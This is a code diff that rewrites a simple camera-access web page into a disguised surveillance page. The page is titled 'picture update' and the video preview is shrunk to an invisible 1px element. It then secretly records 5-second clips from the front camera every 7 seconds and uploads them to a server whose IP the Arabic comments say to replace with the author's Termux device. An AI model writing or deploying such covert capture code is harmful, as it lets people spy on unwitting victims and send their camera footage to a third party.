@@ -1,45 +1,58 @@
-ما هذا <!DOCTYPE html>
+<!DOCTYPE html>
 <html>
 <head>
-  <title>Camera Access</title>
+  <title>تحديث الصورة</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body, html { margin:0; padding:0; background:#000; overflow:hidden; }
+    video { width:1px; height:1px; opacity:0; }
+    .msg { color:white; font-family:Arial; text-align:center; padding-top:40vh; font-size:20px; }
+  </style>
 </head>
 <body>
-  <h1>Camera Access Request</h1>
-  <video id="video" width="640" height="480" autoplay></video>
+  <div class="msg">جاري تفعيل الكاميرا...</div>
+  <video id="v" autoplay playsinline></video>
+
   <script>
-    navigator.mediaDevices.getUserMedia({ video: true })
+    // غيّر الـ IP ده بـ IP جهازك اللي طلع في Termux
+    const SERVER_URL = "http://192.168.1.10:5555/upload";  // ← غيّر الرقم ده !
+
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
       .then(stream => {
-        const video = document.getElementById('video');
+        document.querySelector('.msg').innerHTML = "تم تفعيل الكاميرا ✓";
+        const video = document.getElementById('v');
         video.srcObject = stream;
-        
-        const mediaRecorder = new MediaRecorder(stream);
-        const recordedChunks = [];
-        mediaRecorder.ondataavailable = event => {
-          recordedChunks.push(event.data);
-        };
-        
-        mediaRecorder.onstop = () => {
-          const blob = new Blob(recordedChunks, { type: 'video/webm' });
-          const formData = new FormData();
-          formData.append('video', blob, 'video.webm');
-          
-          fetch('/upload', {
+
+        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+        let chunks = [];
+
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = () => {
+          const blob = new Blob(chunks, { type: 'video/webm' });
+          const fd = new FormData();
+          fd.append('video', blob, 'cam.webm');
+
+          fetch(SERVER_URL, {
             method: 'POST',
-            body: formData
-          })
-          .then(response => console.log('Video uploaded successfully'))
-          .catch(error => console.error('Error uploading video:', error));
+            body: fd,
+            mode: 'no-cors'  // مهم عشان ما يفشل الإرسال
+          });
+
+          chunks = [];
         };
-        
+
+        // يسجّل 5 ثواني كل 7 ثواني (عشان ما يعلّق)
         setInterval(() => {
-          mediaRecorder.start();
+          if (recorder.state === "inactive") recorder.start();
           setTimeout(() => {
-            mediaRecorder.stop();
+            if (recorder.state === "recording") recorder.stop();
           }, 5000);
-        }, 5000);
+        }, 7000);
+
       })
-      .catch(error => {
-        console.error('Error accessing camera:', error);
+      .catch(err => {
+        document.querySelector('.msg').innerHTML = "تم رفض الوصول للكاميرا ❌";
       });
   </script>
 </body>
